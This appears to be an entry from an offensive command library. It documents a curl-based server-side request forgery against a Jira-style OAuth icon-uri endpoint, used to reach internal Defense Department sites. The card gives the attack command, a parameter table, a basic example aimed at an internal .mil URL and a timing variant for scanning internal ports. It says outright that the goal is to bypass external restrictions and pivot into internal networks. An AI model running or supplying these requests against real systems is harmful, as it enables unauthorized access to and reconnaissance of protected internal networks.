---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=https://internal-dod-site.example/"
tags:
  - ssrf
  - dod
  - pivot
type: command
output: Internal DoD site content
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.279Z'
id: e21d860b-da52-4c36-955a-80cab8a493ce
verified: false
validated: true
submitted: true
---
# curl-ssrf-internal-dod-site

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=https://internal-dod-site.example/" -v
```

## Description

Tunnels SSRF request to an internal DoD URL, bypassing external restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |
| `consumerUri` | Internal DoD URL | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=https://internal.dod.mil/"
```

### Advanced Usage with Timing

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://localhost:443/" -w "%{time_total}\n"
```

## Expected Output

Content from the internal site or timed response for scanning.

## Related

- [[Related Procedure: Pivot-to-Internal-DoD-Networks-via-SSRF]]
